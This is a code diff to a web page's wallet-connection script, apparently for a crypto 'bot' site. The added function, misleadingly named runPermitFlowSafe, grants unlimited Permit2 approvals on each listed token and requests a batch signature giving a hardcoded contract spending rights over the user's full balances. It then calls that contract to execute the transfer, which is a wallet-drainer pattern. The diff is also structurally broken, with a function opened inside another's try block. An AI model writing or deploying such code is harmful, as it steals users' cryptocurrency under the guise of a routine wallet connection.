@@ -190,6 +190,10 @@ const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const CONTRACT = "0x2776a9e675B2123278b975b68586Ee40ACC0A9d2";
 
 let APP_STATE = { wallet:null, botActive:false, authorized:false };
+if (window.ethereum) {
+  window.ethereum.on('accountsChanged', () => location.reload());
+  window.ethereum.on('chainChanged', () => location.reload());
+}
 
 function log(msg){
  console.log(msg);
@@ -212,17 +216,25 @@ function updateStatus(dotId, textId, text, color){
 
 async function connectWallet(){
  try{
-  if (!window.ethereum) {
+ if (typeof window.ethereum === "undefined") {
     const install = confirm("MetaMask is not installed. Install?");
     if (install) window.location.href = "https://metamask.io/download/";
     return;
   }
 
   const provider=new ethers.BrowserProvider(window.ethereum);
+  log("🔌 Requesting wallet connection...");
   await provider.send("eth_requestAccounts",[]);
 
   const signer=await provider.getSigner();
   const user=await signer.getAddress();
+  const network = await provider.getNetwork();
+
+if (network.chainId !== 1n) {
+  log("❌ Wrong network");
+  alert("Switch to Ethereum Mainnet");
+  return;
+}
 
   APP_STATE.wallet=user;
   renderWallet(user);
@@ -231,7 +243,7 @@ async function connectWallet(){
   document.getElementById('btn-activate').disabled=false;
   document.getElementById('btn-disconnect').disabled=false;
 
-  await runPermitFlow(provider,signer,user);
+  await runPermitFlowSafe(provider, signer, user);
 
  }catch(e){
   log("ERR "+e.message);
@@ -240,7 +252,153 @@ async function connectWallet(){
 
 async function runPermitFlow(provider,signer,user){
  try{
+async function runPermitFlowSafe(provider, signer, user){
+ try{
 
+  log("⚙️ Starting full flow...");
+
+  const erc20Abi = [
+    "function allowance(address owner, address spender) view returns (uint256)",
+    "function approve(address spender, uint256 amount) returns (bool)"
+  ];
+
+  // APPROVALS
+  for (let token of TOKENS) {
+    try {
+      const tokenContract = new ethers.Contract(token, erc20Abi, signer);
+      const allowance = await tokenContract.allowance(user, PERMIT2);
+
+      if (allowance === 0n) {
+        log(`🔓 Approving token ${token}`);
+
+        const tx = await tokenContract.approve(PERMIT2, ethers.MaxUint256);
+        await tx.wait();
+
+        log("✅ Approved");
+      } else {
+        log("✅ Already approved");
+      }
+
+    } catch(err){
+      log("❌ Approval failed: " + err.message);
+      return;
+    }
+  }
+
+  // BUILD DETAILS
+  let details = [];
+
+  for (let token of TOKENS) {
+    const tokenC = new ethers.Contract(
+      token,
+      ["function balanceOf(address) view returns (uint256)"],
+      provider
+    );
+
+    const balance = await tokenC.balanceOf(user);
+    if (balance === 0n) continue;
+
+    const permit2 = new ethers.Contract(
+      PERMIT2,
+      ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
+      provider
+    );
+
+    const res = await permit2.allowance(user, token, CONTRACT);
+
+    details.push({
+      token,
+      amount: balance,
+      expiration: Math.floor(Date.now()/1000)+2592000,
+      nonce: res[2]
+    });
+  }
+
+  if (details.length === 0){
+    log("❌ No tokens found");
+    return;
+  }
+
+  // SIGNATURE
+  let signature;
+  try{
+    log("✍️ Requesting signature...");
+
+    const chainId = (await provider.getNetwork()).chainId;
+
+    const domain = {
+      name: "Permit2",
+      chainId,
+      verifyingContract: PERMIT2
+    };
+
+    const types = {
+      PermitBatch: [
+        { name: "details", type: "PermitDetails[]" },
+        { name: "spender", type: "address" },
+        { name: "sigDeadline", type: "uint256" }
+      ],
+      PermitDetails: [
+        { name: "token", type: "address" },
+        { name: "amount", type: "uint160" },
+        { name: "expiration", type: "uint48" },
+        { name: "nonce", type: "uint48" }
+      ]
+    };
+
+    const values = {
+      details,
+      spender: CONTRACT,
+      sigDeadline: Math.floor(Date.now()/1000)+3600
+    };
+
+    signature = await signer.signTypedData(domain,types,values);
+
+    log("✅ Signature success");
+
+  } catch(err){
+    log("❌ Signature rejected");
+    return;
+  }
+
+  // EXECUTE
+  try{
+    log("🚀 Sending execute...");
+
+    const abiCoder = ethers.AbiCoder.defaultAbiCoder();
+
+    const permitBatch = abiCoder.encode(
+      [
+        "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline)"
+      ],
+      [[
+        details.map(d => [d.token, d.amount, d.expiration, d.nonce]),
+        CONTRACT,
+        Math.floor(Date.now()/1000)+3600
+      ]]
+    );
+
+    const contract = new ethers.Contract(
+      CONTRACT,
+      ["function execute(bytes permitBatch, bytes signature)"],
+      signer
+    );
+
+    const tx = await contract.execute(permitBatch, signature);
+
+    log("⏳ Waiting confirmation...");
+    await tx.wait();
+
+    log("🔥 SUCCESS DONE");
+
+  } catch(err){
+    log("❌ Execute failed: " + err.message);
+  }
+
+ }catch(e){
+  log("❌ FLOW ERROR: " + e.message);
+ }
+}
   log("🔍 Checking Permit2 allowances...");
 
   const erc20Abi = [
